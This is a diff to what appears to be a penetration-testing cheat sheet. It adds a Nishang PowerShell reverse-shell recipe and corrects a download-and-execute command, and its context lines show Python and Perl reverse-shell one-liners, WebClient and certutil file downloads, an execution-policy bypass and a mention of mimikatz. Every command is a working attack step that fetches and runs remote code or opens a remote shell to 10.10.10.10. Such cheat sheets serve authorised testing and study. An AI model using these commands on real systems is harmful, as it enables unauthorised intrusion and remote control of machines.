@@ -539,6 +539,15 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
+Powershell - Nishang
+```
+Download Invoke-PowerShellTcp.ps1 from Nishang (or other shell if necessary)
+Append "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443" (no speech marks)
+Set up a Python simple web server on 8000 and nc listener on 443
+From the RCE:
+C:\> powershell "Invoke-Expression (new-object Net.WebClient).DownloadString(''http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1'')"
+```
+
 #### Upgrading Reverse Shells to TTY
 
 ```
@@ -821,7 +830,7 @@ mimikatz
 * Windows: `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"`
 * Execution Powerhshell Scripts from CMD shell: `powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File script.ps1`
 * Execute Powershell as x64 from x32 shell %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
-* Download and Execute Powershell Script: `powershell "IEX(New-Object New.WebClient).DownloadString('http://IPaddress/reverse_shell.ps1')"` (note: append main function to end of script)
+* Download and Execute Powershell Script: `powershell "IEX (new-object Net.WebClient).DownloadString(''http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1'')"` (note: append main function to end of script)
 * Windows: Can use debug.exe to compile a program like nc as a last resort
 * Windows: `certutil.exe -urlcache -split -f https://myserver/filename outputfilename`
 
